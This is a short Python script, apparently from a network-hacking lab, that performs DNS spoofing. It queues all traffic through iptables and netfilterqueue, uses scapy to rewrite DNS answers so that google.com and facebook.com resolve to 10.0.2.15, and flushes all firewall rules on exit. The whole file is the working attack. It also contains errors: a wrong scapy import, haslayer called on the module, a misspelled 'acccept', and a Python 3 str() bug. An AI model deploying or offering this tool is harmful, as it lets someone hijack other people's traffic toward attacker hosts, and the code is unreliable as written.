#!/usr/bin/env python
from scapy.all import scapy
import netfilterqueue
import os

dns_hosts = {
    b"www.google.com": "10.0.2.15",
    b"google.com": "10.0.2.15",
    b"facebook.com": "10.0.2.15"
}


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy.haslayer(scapy.DNSRR):
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        print("[After]:", scapy_packet.summary())
        packet.set_payload(str(scapy_packet))

    packet.acccept()


def modify_packet(packet):
    qname = packet[scapy.DNSQR].qname
    if qname not in dns_hosts:
        print("no modification:", qname)
        return packet

    packet[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata=dns_hosts[qname])
    packet[scapy.DNS].ancount = 1

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.UDP].len
    del packet[scapy.UDP].chksum

    return packet


QUEUE_NUM = 0
os.system("iptables -I OUTPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
os.system("iptables -I INPUT -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
queue = netfilterqueue.NetfilterQueue()

try:
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
